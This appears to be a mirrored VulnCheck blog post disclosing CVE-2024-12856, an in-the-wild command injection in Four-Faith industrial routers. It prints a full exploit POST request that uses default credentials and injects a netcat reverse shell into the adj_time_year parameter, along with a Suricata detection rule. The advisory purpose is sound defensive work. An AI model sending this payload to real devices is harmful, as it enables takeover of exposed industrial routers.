---
title: "Four-Faith Industrial Router CVE-2024-12856 Exploited in the Wild - Blog - VulnCheck"
date: 2024-12-27T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Four-Faith Industrial Router CVE-2024-12856 Exploited in the Wild - Blog - VulnCheck

<br/>

<br/>
VulnCheck observed a new post-authentication vulnerability affecting Four-Faith industrial routers being exploited in the wild. The attacker leveraged the router’s default credentials, effectively resulting in unauthenticated remote command injection. VulnCheck has assigned this issue \[CVE-2024-12856\](https://api.vulncheck.com/v3/index/vulncheck-kev?cve=CVE-2024-12856).\\n\\nThe attack can be conducted against, at least, the Four-Faith F3x24 and F3x36 over HTTP using the \`/apply.cgi\` endpoint. \[Censys\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=EXCLUDE&q=same\_service%28services.http.response.headers%3A+%28key%3A+%60Server%60+and+value.headers%3A+%60httpd\_four-faith%60%29+and+services.http.response.protocol%3D%22HTTP%2F1.0%22+and+services.http.response.status\_reason%3D%22Ok%22%29+or+services.http.response.favicons.shodan\_hash%3D%22375199015%22) finds approximately 15,000 internet-facing devices. The systems are vulnerable to OS command injection in the \`adj\_time\_year\` parameter when modifying the device’s system time via \`submit\_type=adjust\_sys\_time\`. The following POST request demonstrates exploitation for a reverse shell.\\n\\n\`\`\`\\nPOST /apply.cgi HTTP/1.1\\nHost: 192.168.1.1:90\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\\nContent-Length: 296\\nAuthorization: Basic YWRtaW46YWRtaW4=\\nContent-Type: application/x-www-form-urlencoded\\nAccept-Encoding: gzip\\nadj\_time\_sec=32&change\_action=gozila\_cgi&adj\_time\_day=27&adj\_time\_mon=10&adj\_time\_hour=11&adj\_time\_year=%24%28cd+%2Ftmp%2F%3B+mknod+bOY+p%3Bcat+bOY%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.1.206+1270+%3EbOY%3B+rm+bOY%3B%29&adj\_time\_min=35&submit\_button=index&action=Save&submit\_type=adjust\_sys\_time\\n\`\`\`\\n\\nOn the device, the result of the injection can be observed using \`ps\`:\\n\\n\`\`\`\\n20938 admin 1640 S sh -c rtc\_tm ss $(cd /tmp/; mknod WaO p;cat WaO|/bin\\n20940 admin 1640 S sh -c rtc\_tm ss $(cd /tmp/; mknod WaO p;cat WaO|/bin\\n20942 admin 1636 S cat WaO\\n20943 admin 1636 S /bin/sh -i\\n20945 admin 1636 S nc 192.168.1.206 1270\\n\`\`\`\\n\\nFor those that have an encyclopedic memory for exploits, this vulnerability should not be confused with \[CVE-2019-12168\](https://api.vulncheck.com/v3/index/vulncheck-kev?cve=CVE-2019-12168). While both flow through the \`apply.cgi\` endpoint, they attack different underlying components (CVE-2019-12168 attacks \`submit\_type=start\` and has an OS injection in the \`ping\_ip\` parameter).\\n\\nVulnCheck observed \[178.215.238\\\[.\\\]91\](https://viz.greynoise.io/ip/178.215.238.91) attempting to exploit this vulnerability. Additionally, we note that this November 2024 \[blog\](https://ducklingstudio.blog.fc2.com/blog-entry-392.html) also calls out exploitation of this vulnerability. Their observed User-Agent even matches the User-Agent VulnCheck observed in the wild (although we saw an entirely different payload).\\n\\nThe \[VulnCheck Initial Access\](https://vulncheck.com/product/initial-access-intelligence) team wrote the following Suricata rule to detect CVE-2024-12856 on the wire:\\n\`\`\`\\nalert http any any -> any any ( \\\\n msg:"VULNCHECK Four-Faith CVE-2024-12856 Exploit Attempt"; \\\\n flow:to\_server; \\\\n http.method; content:"POST"; \\\\n http.uri; content:"/apply.cgi"; startswith; \\\\n http.header\_names; content:"Authorization"; \\\\n http.request\_body; content:"change\_action="; \\\\n content:"adjust\_sys\_time"; \\\\n pcre:"/adj\_time\_\[^=\]+=\[a-zA-Z0-9\]\*\[^a-zA-Z0-9=\]/"; \\\\n classtype:web-application-attack; \\\\n reference:cve,CVE-2024-12856; \\\\n sid:12700438; rev:1;)\\n\`\`\`\\n\\nFinally, pursuant to our \[vulnerability disclosure policy\](https://vulncheck.com/vulnerability-disclosure-policy) for vulnerabilities exploited in the wild, we notified Four-Faith and our customers about this issue on December 20, 2024. Questions about patches, affected models, and affected firmware versions should be directed at Four-Faith.\\n\\n## About VulnCheck\\n\\nThe VulnCheck Initial Access team is always on the lookout for new exploitation in the wild. For more research like this, see our blogs, \[PaperCut Exploitation\](https://vulncheck.com/blog/papercut-rce), \[ProjectSend CVE-2024-11680 Exploited in the Wild\](https://vulncheck.com/blog/projectsend-exploited-itw), \[Fileless Remote Code Execution on Juniper Firewalls\\n\](https://vulncheck.com/blog/juniper-cve-2023-36845), and \[Does Confluence Dream of Shells?\](https://vulncheck.com/blog/confluence-dreams-of-shells)\\n\\nSign up to our website today to get free access to our \[VulnCheck KEV\](https://vulncheck.com/kev) and request a trial of our \[Initial Access Intelligence\](https://vulncheck.com/product/initial-access-intelligence) and \[Exploit & Vulnerability Intelligence\](https://vulncheck.com/product/exploit-intelligence) products.\\n

#### [Source](https://vulncheck.com/blog/four-faith-cve-2024-12856)

<br/>
---
